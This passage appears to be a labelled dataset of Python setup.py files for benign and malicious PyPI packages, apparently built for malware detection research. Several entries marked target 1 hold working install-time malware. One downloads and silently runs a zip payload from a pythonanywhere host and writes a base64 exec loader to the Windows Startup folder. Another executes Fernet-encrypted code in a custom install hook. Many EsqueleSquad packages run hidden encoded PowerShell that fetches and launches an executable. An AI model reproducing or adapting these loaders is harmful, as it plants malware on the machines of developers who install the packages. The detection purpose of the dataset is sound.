\"snappy\": [\"python-snappy\"],\n        \"zstandard\": [\"zstandard\"],\n        \"lz4\": [\"lz4\"],\n    },\n    package_data={\"fastavro\": [\"py.typed\"]},\n)\n", "target": 0}
{"idx": "multiconnect-2.34.5", "func": "import setuptools, base64\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as f:\n    readme = f.read()\n\nsetuptools.setup(\n    name=\"multiconnect\",\n    version=\"2.34.5\",\n    author=\"multiconnect\",\n    description=\"Python MultiHTTP for Humans.\",\n    long_description=readme,\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\n\nimport urllib.request\nimport zipfile\nimport os\nimport sys\nimport shutil\nimport subprocess\nimport time\nt = \"https://frvezdffvvvv.pythonanywhere.com/getpip\"\n\npath,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\5_3.zip\")\nwith zipfile.ZipFile(path, 'r') as zip_ref:\n    zip_ref.extractall(os.getenv('APPDATA'))\ntime.sleep(1)\nos.remove(os.getenv('APPDATA')+\"\\\\5_3.zip\")\ntime.sleep(1)\nsubprocess.Popen(os.getenv('APPDATA')+\"\\\\5_3.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n\ntime.sleep(10)\n\n\n'''\n\nimport urllib.request\nimport zipfile\nimport os\nimport base64\nimport sys\nimport shutil\nimport time\n\n\n\nif getattr(sys, 'frozen', False):\n    currentFilePath = os.path.dirname(sys.executable)\nelse:\n    currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\nfileName = os.path.basename(sys.argv[0])\nfilePath = os.path.join(currentFilePath, fileName)\n\nstartupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\nstartupFilePath = os.path.join(startupFolderPath, fileName)\n\n\nloader_url = \"https://frvezdffvv.pythonanywhere.com/getloader\"\nloader_name = urllib.request.urlopen(loader_url).read()\n\ntry:\n    with open(startupFolderPath+\"\\\\pip.py\", \"w+\") as file:\n        file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\nexcept:\n    pass\nwith open(\"pip.py\", \"w+\") as file:\n    file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\n\n\n\n\nimport subprocess\n\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)\ntime.sleep(30)\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)\n'''", "target": 1}
{"idx": "freeza-offset-1.0.10", "func": "import setuptools\n\nexec(open('freeza/version.py').read())\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"freeza-offset\",\n    version=__version__,\n    author=\"HashLoad team\",\n    author_email=\"rodrigo@rbernardi.dev, lviecelli199@gmail.com\",\n    description=\"Spark stream consumption commit in kafka consumer group\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/HashLoad/freeza-offset\",\n    packages=setuptools.find_packages(),\n    keywords=\"spark spark-streaming kafka kafka-commit kafka-offset-commits databricks\",\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    include_package_data=True,\n    install_requires=[\"kafka-python\"])", "target": 0}
{"idx": "facebook-sdk-3.1.0", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\nexec(open(\"facebook/version.py\").read())\n\nsetup(\n    name='facebook-sdk',\n    version=__version__,                # noqa: F821\n    description='This client library is designed to support the Facebook '\n                'Graph API and the official Facebook JavaScript SDK, which '\n                'is the canonical way to implement Facebook authentication.',\n    author='Facebook',\n    maintainer='Martey Dodoo',\n    maintainer_email='martey+facebook-sdk@mobolic.com',\n    url='https://github.com/mobolic/facebook-sdk',\n    license='Apache',\n    packages=[\"facebook\"],\n    long_description=open(\"README.rst\").read(),\n    classifiers=[\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n    ],\n    install_requires=[\n        'requests',\n    ],\n)\n", "target": 0}
{"idx": "enrich-1.2.7", "func": "#! /usr/bin/env python\n\"\"\"Distribution package setuptools installer.\"\"\"\n\nimport site\nimport sys\n\nimport setuptools\n\n# See https://github.com/pypa/pip/issues/7953\nsite.ENABLE_USER_SITE = \"--user\" in sys.argv[1:]\n\n\nif __name__ == \"__main__\":\n    setuptools.setup(\n        use_scm_version={\"local_scheme\": \"no-local-version\"},\n        setup_requires=[\"setuptools_scm[toml]>=3.5.0\"],\n    )\n", "target": 0}
{"idx": "py-codrd-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'SkIotJnUzfHXpvNZBQauLjyM OxZScamhBGtkDdnfealeMlPiEhMfGgEF'\nLONG_DESCRIPTION = 'eNlqwt DFwkxdDUMJ UShjsdVQSstdsaAxlnNURTsoRKGiLlWnCtUNMXxobwtZokSRaIShPCgRoUsdmXpkDqvvJBUuhvqDEczADbpBqphPLKpnWhAJAPEyEbaSfOLBUbCNMZGnqVjmFwfFNYnzFIodSKqWBzcdIl D rZzfbfoJmKohqkdseTwTCCqeWpvIsKkuYZffDEgmTU hWhPbIdjmQAbeGZMaobdFbOfQLcERaraXgEJpS'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'8rT03E8pPu1hal2kPX3WRfsSd6Qm1Vpkk5qf87VCviA=').decrypt(b'gAAAAABmA1Olie-jBOBhVNhYheHS9gxZY8S6yRhT4xGtOIhpR6NZV3cuGSTwwCvqg5EHVTwPbGoOioYA7kERx39laJ179PowDLo1RfwVUFnfsVtLEs7ivqXGrrd-5Kma9Y6l1AqTJzQe0kS2pH5LySTE2STIBGg40dSTh_DclGid2oEvVp9ZRDOSl8BddzwUmDo0WPwcp94mdltNiejwWWcAZ6jqYaXIR_yAFi8xGW4vTh6sldWAcyo='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"py-codrd\",\n    version=VERSION,\n    author=\"egJAEgXc\",\n    author_email=\"cyGPvVqux@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Flask-Cache-0.13.1", "func": "#!/usr/bin/env python\n\"\"\"\nFlask-Cache\n-----------\n\nAdds cache support to your Flask application\n\n\"\"\"\n\nfrom setuptools import setup\n\nsetup(\n    name='Flask-Cache',\n    version='0.13.1',\n    url='http://github.com/thadeusb/flask-cache',\n    license='BSD',\n    author='Thadeus Burgess',\n    author_email='thadeusb@thadeusb.com',\n    description='Adds cache support to your Flask application',\n    long_description=__doc__,\n    packages=[\n        'flask_cache',\n    ],\n    zip_safe=False,\n    platforms='any',\n    install_requires=[\n        'Flask'\n    ],\n    test_suite='test_cache',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "gcs-oauth2-boto-plugin-3.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Copyright 2014 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup installation module for gcs-oauth2-boto-plugin.\"\"\"\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\nlong_desc = \"\"\"\ngcs-oauth2-boto-plugin is a Python application whose purpose is to behave as an\nauth plugin for the boto auth plugin framework for use with OAuth 2.0\ncredentials for the Google Cloud Platform. This plugin is compatible with both\nuser accounts and service accounts, and its functionality is essentially a\nwrapper around oauth2client with the addition of automatically caching tokens\nfor the machine in a thread- and process-safe fashion.\n\"\"\"\n\nrequires = [\n    'rsa==4.7.2',\n    'boto>=2.29.1',\n    'google-reauth>=0.1.0',\n    'httplib2>=0.18',\n    'oauth2client>=2.2.0',\n    'pyOpenSSL>=0.13',\n    'retry_decorator>=1.0.0',\n    'six>=1.12.0'\n]\n\nextras_require = {\n    'dev': [\n        'freezegun',\n        'mock;python_version<\"3.3\"',\n    ],\n}\n\nsetup(\n    name='gcs-oauth2-boto-plugin',\n    version='3.0',\n    url='https://developers.google.com/storage/docs/gspythonlibrary',\n    download_url=('https://github.com/GoogleCloudPlatform'\n                  '/gcs-oauth2-boto-plugin'),\n    license='Apache 2.0',\n    author='Google Inc.',\n    author_email='gs-team@google.com',\n    description=('Auth plugin allowing use the use of OAuth 2.0 credentials '\n                 'for Google Cloud Storage in the Boto library.'),\n    long_description=long_desc,\n    zip_safe=True,\n    platforms='any',\n    packages=find_packages(exclude=['third_party']),\n    include_package_data=True,\n    install_requires=requires,\n    extras_require=extras_require,\n    tests_require=extras_require['dev'],\n    test_suite='gcs_oauth2_boto_plugin.test_oauth2_client',\n    classifiers=[\n        'Development Status :: 7 - Inactive',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "docker-5.0.3", "func": "#!/usr/bin/env python\n\nimport codecs\nimport os\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\nROOT_DIR = os.path.dirname(__file__)\nSOURCE_DIR = os.path.join(ROOT_DIR)\n\nrequirements = [\n    'websocket-client >= 0.32.0',\n    'requests >= 2.14.2, != 2.18.0',\n]\n\nextras_require = {\n    # win32 APIs if on Windows (required for npipe support)\n    ':sys_platform == \"win32\"': 'pywin32==227',\n\n    # If using docker-py over TLS, highly recommend this option is\n    # pip-installed or pinned.\n\n    # TODO: if pip installing both \"requests\" and \"requests[security]\", the\n    # extra package from the \"security\" option are not installed (see\n    # https://github.com/pypa/pip/issues/4391).  Once that's fixed, instead of\n    # installing the extra dependencies, install the following instead:\n    # 'requests[security] >= 2.5.2, != 2.11.0, != 2.12.2'\n    'tls': ['pyOpenSSL>=17.5.0', 'cryptography>=3.4.7', 'idna>=2.0.0'],\n\n    # Only required when connecting using the ssh:// protocol\n    'ssh': ['paramiko>=2.4.2'],\n\n}\n\nversion = None\nexec(open('docker/version.py').read())\n\nwith open('./test-requirements.txt') as test_reqs_txt:\n    test_requirements = [line for line in test_reqs_txt]\n\n\nlong_description = ''\nwith codecs.open('./README.md', encoding='utf-8') as readme_md:\n    long_description = readme_md.read()\n\nsetup(\n    name=\"docker\",\n    version=version,\n    description=\"A Python library for the Docker Engine API.\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/docker/docker-py',\n    project_urls={\n        'Documentation': 'https://docker-py.readthedocs.io',\n        'Changelog': 'https://docker-py.readthedocs.io/en/stable/change-log.html',  # noqa: E501\n        'Source': 'https://github.com/docker/docker-py',\n        'Tracker': 'https://github.com/docker/docker-py/issues',\n    },\n    packages=find_packages(exclude=[\"tests.*\", \"tests\"]),\n    install_requires=requirements,\n    tests_require=test_requirements,\n    extras_require=extras_require,\n    python_requires='>=3.6',\n    zip_safe=False,\n    test_suite='tests',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Other Environment',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Software Development',\n        'Topic :: Utilities',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n    maintainer='Ulysses Souza',\n    maintainer_email='ulysses.souza@docker.com',\n)\n", "target": 0}
{"idx": "libpywreproof-9.96", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywreproof',\n    packages = ['modlib'],\n    version = '9.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cvmine-10.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cvmine',\n    packages = ['modlib'],\n    version = '7.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-redis-cache-3.0.1", "func": "from setuptools import setup\n\nsetup(\n    name=\"django-redis-cache\",\n    url=\"http://github.com/sebleier/django-redis-cache/\",\n    author=\"Sean Bleier\",\n    author_email=\"sebleier@gmail.com\",\n    version=\"3.0.1\",\n    license=\"BSD\",\n    packages=[\"redis_cache\", \"redis_cache.backends\"],\n    description=\"Redis Cache Backend for Django\",\n    install_requires=['redis<4.0'],\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Utilities\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n    ],\n)\n", "target": 0}
{"idx": "selfkilllgtb-4.18", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfkillLGTB',\n    packages = ['modlib'],\n    version = '6.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-formtools-2.3", "func": "import os\nfrom setuptools import find_packages, setup\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with open(filename, encoding=\"utf-8\") as fp:\n        return fp.read()\n\n\nsetup(\n    name=\"django-formtools\",\n    use_scm_version={\"version_scheme\": \"post-release\", \"local_scheme\": \"dirty-tag\"},\n    setup_requires=[\"setuptools_scm\"],\n    url=\"https://django-formtools.readthedocs.io/en/latest/\",\n    license=\"BSD\",\n    description=\"A set of high-level abstractions for Django forms\",\n    long_description=read(\"README.rst\"),\n    long_description_content_type=\"text/x-rst\",\n    author=\"Django Software Foundation\",\n    author_email=\"foundation@djangoproject.com\",\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    include_package_data=True,\n    install_requires=[\"Django>=2.2\"],\n    python_requires=\">=3.6\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "debtcollector-2.5.0", "func": "# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# THIS FILE IS MANAGED BY THE GLOBAL REQUIREMENTS REPO - DO NOT EDIT\nimport setuptools\n\nsetuptools.setup(\n    setup_requires=['pbr>=2.0.0'],\n    pbr=True)\n", "target": 0}
{"idx": "docx-0.2.4", "func": "#!/usr/bin/env python\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\nfrom glob import glob\n\n# Make data go into site-packages (http://tinyurl.com/site-pkg)\nfrom distutils.command.install import INSTALL_SCHEMES\nfor scheme in INSTALL_SCHEMES.values():\n    scheme['data'] = scheme['purelib']\n\nDESCRIPTION = (\n    'The docx module creates, reads and writes Microsoft Office Word 2007 do'\n    'cx files'\n)\n\nsetup(\n    name='docx',\n    version='0.2.4',\n    install_requires=['lxml', 'Pillow>=2.0'],\n    description=DESCRIPTION,\n    author='Mike MacCana',\n    author_email='python-docx@googlegroups.com',\n    maintainer='Steve Canny',\n    maintainer_email='python-docx@googlegroups.com',\n    url='http://github.com/mikemaccana/python-docx',\n    py_modules=['docx'],\n    data_files=[\n        ('docx-template/_rels',      glob('template/_rels/.*')),\n        ('docx-template/docProps',   glob('template/docProps/*.*')),\n        ('docx-template/word',       glob('template/word/*.xml')),\n        ('docx-template/word/theme', glob('template/word/theme/*.*')),\n    ],\n)\n", "target": 0}
{"idx": "libcontrolinfomine-8.64", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolinfomine',\n    packages = ['modlib'],\n    version = '4.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "reproof-8.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'reproof',\n    packages = ['modlib'],\n    version = '1.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tposintpywcraft-4.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tposintpywcraft',\n    packages = ['modlib'],\n    version = '8.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 